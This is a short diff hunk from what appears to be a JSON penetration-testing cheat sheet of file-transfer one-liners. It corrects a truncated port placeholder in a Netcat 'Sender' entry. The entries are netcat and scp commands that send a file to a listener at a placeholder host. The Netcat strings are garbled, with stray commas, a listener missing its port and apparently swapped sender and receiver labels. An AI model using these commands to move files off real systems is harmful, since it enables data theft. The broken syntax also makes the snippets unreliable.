@@ -31230,7 +31230,7 @@
       "scp user@[LHOST]:~/path_to_file file_saved -P [LPORT] # Reciever"
     ],
     "Netcat": [
-      "nc -lnvp ; ,[LPO],nc [LHOST] [LPORT] < [File] # Sender",
+      "nc -lnvp ; ,[LPORT],nc [LHOST] [LPORT] < [File] # Sender",
       "nc ,[LHOST], ,[LPORT], ,<, ,[File] # Reciever"
     ]
   }
